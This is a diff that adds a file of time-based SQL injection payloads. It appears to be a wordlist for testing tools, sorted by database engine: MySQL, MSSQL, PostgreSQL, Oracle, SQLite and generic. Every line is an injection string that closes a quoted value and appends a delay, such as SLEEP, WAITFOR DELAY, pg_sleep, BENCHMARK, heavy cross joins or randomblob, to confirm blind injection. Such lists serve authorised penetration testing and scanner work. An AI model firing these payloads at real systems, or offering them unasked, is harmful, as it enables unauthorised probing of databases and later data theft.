@@ -1,0 +1,35 @@
+# Time-Based SQL Injection Payloads
+# MySQL
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+'; SLEEP(5)--
+' AND SLEEP(5)#
+' OR SLEEP(5)#
+'; SLEEP(5)#
+' AND BENCHMARK(5000000,MD5('test'))--
+' OR BENCHMARK(5000000,MD5('test'))--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--
+# MSSQL
+'; WAITFOR DELAY '0:0:5'--
+' OR WAITFOR DELAY '0:0:5'--
+' AND WAITFOR DELAY '0:0:5'--
+'; WAITFOR DELAY '0:0:5'
+' OR WAITFOR DELAY '0:0:5'
+' AND WAITFOR DELAY '0:0:5'
+# PostgreSQL
+' AND pg_sleep(5)--
+' OR pg_sleep(5)--
+'; pg_sleep(5)--
+' AND (SELECT pg_sleep(5))--
+' OR (SELECT pg_sleep(5))--
+# Oracle
+' AND (SELECT COUNT(*) FROM ALL_USERS T1, ALL_USERS T2, ALL_USERS T3) > 0--
+' OR (SELECT COUNT(*) FROM ALL_USERS T1, ALL_USERS T2, ALL_USERS T3) > 0--
+# SQLite
+' AND randomblob(100000000)--
+' OR randomblob(100000000)--
+# Generic
+' AND (SELECT * FROM (SELECT(SLEEP(5)))XYZZY)--
+' OR (SELECT * FROM (SELECT(SLEEP(5)))XYZZY)--
+'; (SELECT * FROM (SELECT(SLEEP(5)))XYZZY)--
